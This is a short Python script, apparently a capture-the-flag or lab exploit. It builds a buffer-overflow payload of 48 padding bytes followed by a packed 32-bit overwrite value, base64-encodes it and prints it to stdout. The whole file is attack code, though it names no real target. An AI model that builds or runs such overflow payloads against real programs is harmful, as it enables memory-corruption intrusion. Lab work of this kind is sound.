
import sys
import struct
import base64

buf = b'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ'
buf += struct.pack('<I', 2760134230)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
